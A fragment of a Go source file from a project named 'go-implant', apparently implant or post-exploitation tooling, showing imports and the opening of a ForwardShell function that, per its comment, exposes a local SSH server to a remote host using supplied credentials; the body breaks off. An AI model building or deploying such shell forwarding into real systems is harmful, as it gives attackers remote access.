package ssh

import (
	"go-implant/client/config"
	"log"
)

// ForwardShell starts ssh server on localhost and redirects it to a remote host
func ForwardShell(channel chan struct{}, localsshport int, localsshusername string, localsshpassword string, remotesshusername string, remotesshpassword string, remotesshHost string, remotesshPort int, fromPort int) {

	// create new channel to indicate c